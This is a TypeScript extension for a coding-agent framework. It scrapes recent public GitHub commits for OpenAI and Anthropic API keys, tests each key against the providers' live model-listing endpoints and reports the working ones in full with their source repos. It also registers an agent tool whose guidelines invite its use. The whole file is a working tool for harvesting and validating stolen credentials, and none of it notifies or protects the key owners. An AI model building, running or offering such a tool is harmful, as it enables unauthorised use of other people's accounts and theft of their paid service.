/**
 * API Key Scraper Extension
 *
 * Scrapes recent GitHub activity for leaked OpenAI and Anthropic API keys,
 * validates them by making test requests, and reports working keys.
 */

import type { ExtensionAPI, ExtensionContext } from "@mariozechner/pi-coding-agent";
import { Type } from "typebox";

// API key patterns
const API_KEY_PATTERNS = [
  // OpenAI API keys (sk-...)
  { name: "openai", pattern: /sk-[a-zA-Z0-9]{48}/g },
  // Anthropic API keys (sk-ant-...)
  { name: "anthropic", pattern: /sk-ant-[a-zA-Z0-9]{32,}/g },
];

// Keywords to search for in commit messages/diffs
const LEAK_KEYWORDS = [
  "api key",
  "apikey",
  "api_key",
  "secret",
  "token",
  "credential",
  "password",
  "auth",
  "openai",
  "anthropic",
  "sk-",
  "key",
  "config",
  "env",
  "dotenv",
  "commit",
  "accident",
  "oops",
  "remove",
  "delete",
  "fix",
  "revert",
];

// Additional suspicious patterns in commit messages
const SUSPICIOUS_PATTERNS = [
  /sk-[a-zA-Z0-9]{10,}/,
  /sk-ant-[a-zA-Z0-9]+/,
  /api[_-]?key/i,
  /apikey/i,
  /secret/i,
  /token/i,
  /password/i,
  /OPENAI/i,
  /ANTHROPIC/i,
];

// Sample rate for non-suspicious commits (to catch keys in otherwise innocent commits)
const SAMPLE_RATE = 0.05; // Sample 5% of non-suspicious commits

interface ScannedCommit {
  repo: string;
  sha: string;
  message: string;
  author: string;
  date: string;
  url: string;
  potentialKeys: Array<{
    type: string;
    value: string;
    context: string;
  }>;
}

interface ValidatedKey {
  key: string;
  type: "openai" | "anthropic";
  source: ScannedCommit;
  valid: boolean;
  testResponse?: string;
  error?: string;
}

// Cache for processed commits to avoid re-scanning
let scannedCommits: ScannedCommit[] = [];
let validatedKeys: ValidatedKey[] = [];

/**
 * Extract potential API keys from text content
 */
function extractPotentialKeys(text: string, context = ""): Array<{ type: string; value: string; context: string }> {
  const found: Array<{ type: string; value: string; context: string }> = [];
  
  for (const { name, pattern } of API_KEY_PATTERNS) {
    const matches = text.matchAll(pattern);
    for (const match of matches) {
      // Get surrounding context (50 chars before and after)
      const start = Math.max(0, match.index! - 50);
      const end = Math.min(text.length, match.index! + match[0].length + 50);
      const surroundingContext = text.slice(start, end);
      
      found.push({
        type: name,
        value: match[0],
        context: surroundingContext,
      });
    }
  }
  
  return found;
}

/**
 * Check if a commit looks suspicious based on message patterns
 */
function isSuspiciousCommit(message: string): boolean {
  const msgLower = message.toLowerCase();
  
  // Check for leak keywords
  if (LEAK_KEYWORDS.some(kw => msgLower.includes(kw.toLowerCase()))) {
    return true;
  }
  
  // Check for suspicious patterns
  if (SUSPICIOUS_PATTERNS.some(p => p.test(message))) {
    return true;
  }
  
  return false;
}

/**
 * Fetch recent commits from GitHub using the public events API
 */
async function fetchRecentCommits(
  pi: ExtensionAPI,
  signal: AbortSignal,
  maxPages = 3
): Promise<ScannedCommit[]> {
  const commits: ScannedCommit[] = [];
  
  for (let page = 1; page <= maxPages; page++) {
    // Fetch recent public events
    const response = await fetch(
      `https://api.github.com/events?per_page=100&page=${page}`,
      {
        headers: {
          "Accept": "application/vnd.github.v3+json",
          "User-Agent": "pi-api-key-scraper",
        },
        signal,
      }
    );
    
    if (!response.ok) {
      throw new Error(`GitHub API error: ${response.status} ${response.statusText}`);
    }
    
    const events = await response.json() as Array<{
      type: string;
      repo: { name: string };
      payload?: {
        commits?: Array<{
          sha: string;
          message: string;
          author?: { name: string; email: string };
          url: string;
        }>;
        head?: string;
      };
      created_at: string;
    }>;
    
    for (const event of events) {
      if (event.type !== "PushEvent" || !event.payload?.commits) continue;
      
      for (const commit of event.payload.commits) {
        // Check for API key patterns in commit message first
        const keysInMessage = extractPotentialKeys(commit.message);
        
        // Check if commit message looks suspicious
        const isSuspicious = isSuspiciousCommit(commit.message);
        
        // Check for API key patterns in commit message
        // Also sample non-suspicious commits at a low rate to catch accidental leaks
        const shouldSample = Math.random() < SAMPLE_RATE;
        
        if (isSuspicious || keysInMessage.length > 0 || shouldSample) {
          commits.push({
            repo: event.repo.name,
            sha: commit.sha,
            message: commit.message,
            author: commit.author?.name || "unknown",
            date: event.created_at,
            url: commit.url,
            potentialKeys: keysInMessage,
          });
        }
      }
    }
  }
  
  return commits;
}

/**
 * Fetch the actual diff/content for a commit to find embedded keys
 */
async function fetchCommitDiff(
  commit: ScannedCommit,
  signal: AbortSignal
): Promise<string> {
  try {
    const response = await fetch(
      `https://api.github.com/repos/${commit.repo}/commits/${commit.sha}`,
      {
        headers: {
          "Accept": "application/vnd.github.v3+json",
          "User-Agent": "pi-api-key-scraper",
        },
        signal,
      }
    );
    
    if (!response.ok) {
      return "";
    }
    
    const data = await response.json() as {
      files?: Array<{
        patch?: string;
        filename: string;
      }>;
    };
    
    // Combine all patches
    let diffContent = "";
    for (const file of (data.files || [])) {
      if (file.patch) {
        diffContent += `\n=== ${file.filename} ===\n${file.patch}\n`;
      }
    }
    
    return diffContent;
  } catch {
    return "";
  }
}

/**
 * Test if an OpenAI API key is valid
 */
async function testOpenAIKey(key: string, signal: AbortSignal): Promise<{ valid: boolean; response?: string; error?: string }> {
  try {
    const response = await fetch("https://api.openai.com/v1/models", {
      headers: {
        "Authorization": `Bearer ${key}`,
        "Content-Type": "application/json",
      },
      signal,
    });
    
    if (response.status === 401) {
      return { valid: false, error: "Invalid API key (401)" };
    }
    
    if (response.ok) {
      const data = await response.json() as { data?: Array<{ id: string }> };
      const modelCount = data.data?.length || 0;
      return { 
        valid: true, 
        response: `Valid key with access to ${modelCount} models` 
      };
    }
    
    return { 
      valid: false, 
      error: `HTTP ${response.status}: ${response.statusText}` 
    };
  } catch (err) {
    return { 
      valid: false, 
      error: err instanceof Error ? err.message : String(err) 
    };
  }
}

/**
 * Test if an Anthropic API key is valid
 */
async function testAnthropicKey(key: string, signal: AbortSignal): Promise<{ valid: boolean; response?: string; error?: string }> {
  try {
    const response = await fetch("https://api.anthropic.com/v1/models", {
      headers: {
        "x-api-key": key,
        "anthropic-version": "2023-06-01",
      },
      signal,
    });
    
    if (response.status === 401) {
      return { valid: false, error: "Invalid API key (401)" };
    }
    
    if (response.ok) {
      const data = await response.json() as { data?: Array<{ id: string }> };
      const modelCount = data.data?.length || 0;
      return { 
        valid: true, 
        response: `Valid key with access to ${modelCount} models` 
      };
    }
    
    return { 
      valid: false, 
      error: `HTTP ${response.status}: ${response.statusText}` 
    };
  } catch (err) {
    return { 
      valid: false, 
      error: err instanceof Error ? err.message : String(err) 
    };
  }
}

/**
 * Validate a potential API key
 */
async function validateKey(
  keyInfo: { type: string; value: string; context: string },
  source: ScannedCommit,
  signal: AbortSignal
): Promise<ValidatedKey> {
  let result: { valid: boolean; response?: string; error?: string };
  
  if (keyInfo.type === "openai") {
    result = await testOpenAIKey(keyInfo.value, signal);
  } else if (keyInfo.type === "anthropic") {
    result = await testAnthropicKey(keyInfo.value, signal);
  } else {
    return {
      key: keyInfo.value,
      type: keyInfo.type as "openai" | "anthropic",
      source,
      valid: false,
      error: "Unknown key type",
    };
  }
  
  return {
    key: keyInfo.value,
    type: keyInfo.type as "openai" | "anthropic",
    source,
    valid: result.valid,
    testResponse: result.response,
    error: result.error,
  };
}

/**
 * Main extension factory
 */
export default function apiKeyScraperExtension(pi: ExtensionAPI) {
  // Restore state from session on startup
  pi.on("session_start", async (_event, ctx) => {
    // Try to restore previous scan results from session
    for (const entry of ctx.sessionManager.getEntries()) {
      if (entry.type === "custom" && entry.customType === "api-key-scanner-results") {
        const data = entry.data as { scanned: ScannedCommit[]; validated: ValidatedKey[] };
        scannedCommits = data.scanned || [];
        validatedKeys = data.validated || [];
      }
    }
  });
  
  // Save state to session on shutdown
  pi.on("session_shutdown", async () => {
    pi.appendEntry("api-key-scanner-results", {
      scanned: scannedCommits,
      validated: validatedKeys,
    });
  });
  
  // Register the scan command
  pi.registerCommand("scan-leaked-keys", {
    description: "Scan GitHub for leaked API keys and test them",
    handler: async (_args, ctx) => {
      const signal = ctx.signal || new AbortController().signal;
      
      ctx.ui.notify("Starting GitHub API key scan...", "info");
      
      try {
        // Step 1: Fetch recent commits
        ctx.ui.setStatus("api-scanner", "Fetching recent commits...");
        const commits = await fetchRecentCommits(pi, signal, 3);
        
        ctx.ui.notify(`Found ${commits.length} suspicious commits`, "info");
        
        // Step 2: Fetch diffs for commits that don't already have keys extracted
        const commitsNeedingDiffs = commits.filter(c => 
          c.potentialKeys.length === 0 && 
          !scannedCommits.some(sc => sc.sha === c.sha)
        );
        
        for (let i = 0; i < commitsNeedingDiffs.length; i++) {
          ctx.ui.setStatus("api-scanner", `Fetching diffs... (${i + 1}/${commitsNeedingDiffs.length})`);
          const commit = commitsNeedingDiffs[i];
          const diff = await fetchCommitDiff(commit, signal);
          
          if (diff) {
            const keysFromDiff = extractPotentialKeys(diff);
            commit.potentialKeys.push(...keysFromDiff);
          }
          
          // Small delay to avoid rate limiting
          if (i < commitsNeedingDiffs.length - 1) {
            await new Promise(r => setTimeout(r, 500));
          }
        }
        
        // Update scanned commits cache
        scannedCommits = [...scannedCommits, ...commits];
        
        // Step 3: Collect all unique keys to test
        const keysToTest: Array<{ key: { type: string; value: string; context: string }; source: ScannedCommit }> = [];
        const seenKeys = new Set(validatedKeys.map(k => k.key));
        
        for (const commit of commits) {
          for (const key of commit.potentialKeys) {
            if (!seenKeys.has(key.value)) {
              keysToTest.push({ key, source: commit });
              seenKeys.add(key.value);
            }
          }
        }
        
        ctx.ui.notify(`Found ${keysToTest.length} unique keys to test`, "info");
        
        // Step 4: Test keys
        const newValidated: ValidatedKey[] = [];
        for (let i = 0; i < keysToTest.length; i++) {
          const { key, source } = keysToTest[i];
          ctx.ui.setStatus("api-scanner", `Testing ${key.type} key... (${i + 1}/${keysToTest.length})`);
          
          const validated = await validateKey(key, source, signal);
          newValidated.push(validated);
          
          if (validated.valid) {
            ctx.ui.notify(`⚠️ FOUND VALID ${key.type.toUpperCase()} KEY!`, "warning");
          }
          
          // Delay between requests
          if (i < keysToTest.length - 1) {
            await new Promise(r => setTimeout(r, 1000));
          }
        }
        
        validatedKeys = [...validatedKeys, ...newValidated];
        
        // Step 5: Report results
        const validKeys = validatedKeys.filter(k => k.valid);
        
        ctx.ui.setStatus("api-scanner", undefined);
        
        // Send report as custom message
        pi.sendMessage({
          customType: "api-key-scanner-report",
          content: `API Key Scan Complete

**Summary:**
- Commits scanned: ${scannedCommits.length}
- Keys tested: ${validatedKeys.length}
- **VALID KEYS FOUND: ${validKeys.length}**

${validKeys.length > 0 ? "⚠️ WORKING API KEYS DETECTED:\n\n" : "No valid keys found."}
${validKeys.map(k => `
**${k.type.toUpperCase()} Key**
- Key: \`${k.key}\`
- Source: ${k.source.repo}@${k.source.sha.slice(0, 7)}
- Test Result: ${k.testResponse}
- Commit: ${k.source.message.slice(0, 100)}
`).join("\n")}
`,
          display: true,
          details: {
            scannedCommits: scannedCommits.length,
            testedKeys: validatedKeys.length,
            validKeys: validKeys.map(k => ({
              type: k.type,
              key: k.key,
              repo: k.source.repo,
              sha: k.source.sha,
              message: k.source.message,
            })),
          },
        });
        
      } catch (err) {
        ctx.ui.setStatus("api-scanner", undefined);
        ctx.ui.notify(`Scan failed: ${err instanceof Error ? err.message : String(err)}`, "error");
        throw err;
      }
    },
  });
  
  // Register a tool for programmatic access
  pi.registerTool({
    name: "scan_leaked_api_keys",
    label: "Scan Leaked API Keys",
    description: "Scans recent GitHub commits for potentially leaked OpenAI and Anthropic API keys, tests them, and returns a report of any valid keys found.",
    promptSnippet: "Scan GitHub for leaked API keys and validate them",
    promptGuidelines: [
      "Use scan_leaked_api_keys when the user wants to find and test leaked API keys on GitHub.",
      "This tool searches recent public commits for OpenAI (sk-...) and Anthropic (sk-ant-...) API key patterns.",
      "Valid keys found will be reported with their source commit information.",
    ],
    parameters: Type.Object({
      maxPages: Type.Optional(Type.Number({ description: "Maximum pages of GitHub events to scan (default: 3)" })),
    }),
    async execute(_toolCallId, params, signal, onUpdate, ctx) {
      onUpdate?.({ content: [{ type: "text", text: "Scanning GitHub for leaked API keys..." }] });
      
      try {
        const maxPages = params.maxPages || 3;
        
        // Fetch commits
        onUpdate?.({ content: [{ type: "text", text: "Fetching recent commits..." }] });
        const commits = await fetchRecentCommits(pi, signal || new AbortController().signal, maxPages);
        
        onUpdate?.({ content: [{ type: "text", text: `Found ${commits.length} suspicious commits` }] });
        
        // Fetch diffs for commits without keys
        const commitsNeedingDiffs = commits.filter(c => c.potentialKeys.length === 0);
        
        for (let i = 0; i < commitsNeedingDiffs.length; i++) {
          onUpdate?.({ content: [{ type: "text", text: `Fetching diffs... (${i + 1}/${commitsNeedingDiffs.length})` }] });
          const commit = commitsNeedingDiffs[i];
          const diff = await fetchCommitDiff(commit, signal || new AbortController().signal);
          
          if (diff) {
            const keysFromDiff = extractPotentialKeys(diff);
            commit.potentialKeys.push(...keysFromDiff);
          }
          
          if (i < commitsNeedingDiffs.length - 1) {
            await new Promise(r => setTimeout(r, 500));
          }
        }
        
        // Collect keys to test
        const keysToTest: Array<{ key: { type: string; value: string; context: string }; source: ScannedCommit }> = [];
        const seenKeys = new Set<string>();
        
        for (const commit of commits) {
          for (const key of commit.potentialKeys) {
            if (!seenKeys.has(key.value)) {
              keysToTest.push({ key, source: commit });
              seenKeys.add(key.value);
            }
          }
        }
        
        onUpdate?.({ content: [{ type: "text", text: `Found ${keysToTest.length} unique keys to test` }] });
        
        // Test keys
        const newValidated: ValidatedKey[] = [];
        for (let i = 0; i < keysToTest.length; i++) {
          const { key, source } = keysToTest[i];
          onUpdate?.({ content: [{ type: "text", text: `Testing ${key.type} key ${i + 1}/${keysToTest.length}...` }] });
          
          const validated = await validateKey(key, source, signal || new AbortController().signal);
          newValidated.push(validated);
          
          if (i < keysToTest.length - 1) {
            await new Promise(r => setTimeout(r, 1000));
          }
        }
        
        const validKeys = newValidated.filter(k => k.valid);
        
        return {
          content: [{ 
            type: "text", 
            text: `Scan complete!\n\n**Results:**\n- Commits scanned: ${commits.length}\n- Keys tested: ${newValidated.length}\n- **Valid keys found: ${validKeys.length}**\n\n${validKeys.length > 0 ? validKeys.map(k => `⚠️ VALID ${k.type.toUpperCase()} KEY: ${k.key} from ${k.source.repo}@${k.source.sha.slice(0, 7)}`).join("\n") : "No valid keys discovered."}` 
          }],
          details: {
            scanned: commits.length,
            tested: newValidated.length,
            valid: validKeys.length,
            validKeys: validKeys.map(k => ({
              type: k.type,
              key: k.key,
              repo: k.source.repo,
              sha: k.source.sha,
              message: k.source.message,
              response: k.testResponse,
            })),
            invalidKeys: newValidated.filter(k => !k.valid).map(k => ({
              type: k.type,
              key: k.key,
              error: k.error,
            })),
          },
        };
        
      } catch (err) {
        return {
          content: [{ type: "text", text: `Scan failed: ${err instanceof Error ? err.message : String(err)}` }],
          isError: true,
          details: { error: err instanceof Error ? err.message : String(err) },
        };
      }
    },
  });
  
  // Register a command to show scan history
  pi.registerCommand("show-key-scans", {
    description: "Show previously scanned commits and validated keys",
    handler: async (_args, ctx) => {
      const validKeys = validatedKeys.filter(k => k.valid);
      
      pi.sendMessage({
        customType: "api-key-scanner-history",
        content: `API Key Scan History

**Total Commits Scanned:** ${scannedCommits.length}
**Total Keys Tested:** ${validatedKeys.length}
**Valid Keys Found:** ${validKeys.length}

${validKeys.length > 0 ? "**Valid Working Keys:**\n" : ""}
${validKeys.map(k => `
- **${k.type}**: \`${k.key}\`
  - Repo: ${k.source.repo}
  - Commit: ${k.source.sha.slice(0, 7)} - ${k.source.message.slice(0, 80)}
  - Result: ${k.testResponse}
`).join("\n")}
`,
        display: true,
        details: {
          scanned: scannedCommits.map(c => ({
            repo: c.repo,
            sha: c.sha,
            message: c.message,
            author: c.author,
            date: c.date,
          })),
          validated: validatedKeys.map(k => ({
            key: k.key,
            type: k.type,
            valid: k.valid,
            error: k.error,
          })),
        },
      });
    },
  });
  
  // Register a command to clear scan history
  pi.registerCommand("clear-key-scans", {
    description: "Clear the scan history cache",
    handler: async (_args, ctx) => {
      scannedCommits = [];
      validatedKeys = [];
      ctx.ui.notify("Scan history cleared", "success");
    },
  });
}
